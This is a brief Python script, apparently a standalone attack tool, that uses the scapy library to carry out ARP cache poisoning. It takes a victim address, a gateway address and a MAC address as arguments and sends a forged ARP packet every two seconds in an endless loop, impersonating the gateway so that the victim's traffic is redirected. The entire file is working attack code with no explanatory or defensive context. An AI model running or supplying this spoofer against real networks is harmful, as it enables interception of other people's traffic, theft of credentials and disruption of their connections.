#coding: utf-8
#!/usr/bin/env python
from scapy.all import *
import time
import sys
op=1 
victim=sys.argv[1]
gateway=sys.argv[2]
mac=sys.argv[3]
arp=ARP(op=op,psrc=gateway,pdst=victim,hwdst=mac)
while 1:
	send(arp)
	time.sleep(2)
